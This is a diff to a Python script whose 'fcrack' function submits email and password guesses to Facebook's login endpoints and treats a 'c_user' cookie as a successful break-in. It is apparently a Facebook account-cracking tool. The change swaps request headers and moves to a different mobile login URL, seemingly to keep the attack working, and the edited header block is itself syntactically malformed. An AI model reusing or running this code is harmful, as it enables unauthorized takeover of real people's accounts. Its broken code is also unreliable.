@@ -1467,40 +1467,45 @@ def fcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'free.facebook.com',
+            header_freefb = {'authority': 'm.facebook.com',
+{'authority':'m.facebook.com',
 
-            'method': 'GET',
+			'upgrade-insecure-requests': '1',
 
-            'path': '/',
+			'viewport-width': '980',
 
-            'scheme': 'https',
+			'method': 'path',
 
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+			'scheme': 'https',
 
-            'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
 
-            'cache-control': 'max-age=0',
+			'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 
 
-            'referer': 'https://free.facebook.com/',
+			'dnt':'1', 
 
-            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+			'x-requested-with':'mark.via.gp', 
 
-            'sec-ch-ua-mobile': '?1',
+			'sec-fetch-site': 'none',
 
-            'sec-ch-ua-platform': '"Android"',
+			'sec-fetch-mode': 'navigate',
 
-            'sec-fetch-dest': 'document',
+			'sec-fetch-user': '?1',
 
-            'sec-fetch-mode': 'navigate',
+			'sec-fetch-dest': 'document',
 
-            'sec-fetch-site': 'same-origin',
+			'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
 
-            'sec-fetch-user': '?1',
+			'cache-control': 'max-age=0',
 
-            'upgrade-insecure-requests': '1',
+			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
 
-            'user-agent': pro}
-            lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
+
+			"sec-ch-prefers-color-scheme": "light",
+
+			'user-agent': pro}
+            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
             if 'c_user' in log_cookies:
